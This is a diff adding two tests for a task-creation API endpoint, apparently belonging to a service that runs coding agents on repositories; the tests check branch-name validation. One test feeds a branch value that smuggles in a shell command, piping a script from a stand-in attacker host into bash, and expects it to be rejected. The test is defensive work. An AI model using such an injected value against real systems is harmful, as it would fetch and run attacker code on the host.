@@ -292,6 +292,40 @@ describe("POST /api/tasks", () => {
 
     expect(res.statusCode).toBe(500);
   });
+
+  it("rejects repoBranch with shell injection characters", async () => {
+    const res = await app.inject({
+      method: "POST",
+      url: "/api/tasks",
+      payload: {
+        title: "Fix bug",
+        prompt: "Fix the bug",
+        repoUrl: "https://github.com/org/repo",
+        repoBranch: "main; curl attacker.com/shell.sh | bash #",
+      },
+    });
+
+    expect(res.statusCode).toBe(500);
+  });
+
+  it("accepts valid repoBranch names", async () => {
+    mockCreateTask.mockResolvedValue({ ...mockTaskData, id: "new-task" });
+    mockTransitionTask.mockResolvedValue(undefined);
+
+    const res = await app.inject({
+      method: "POST",
+      url: "/api/tasks",
+      payload: {
+        title: "Fix bug",
+        prompt: "Fix the bug",
+        repoUrl: "https://github.com/org/repo",
+        repoBranch: "feature/my-branch.v2",
+        agentType: "claude-code",
+      },
+    });
+
+    expect(res.statusCode).toBe(201);
+  });
 });
 
 describe("POST /api/tasks/:id/cancel", () => {
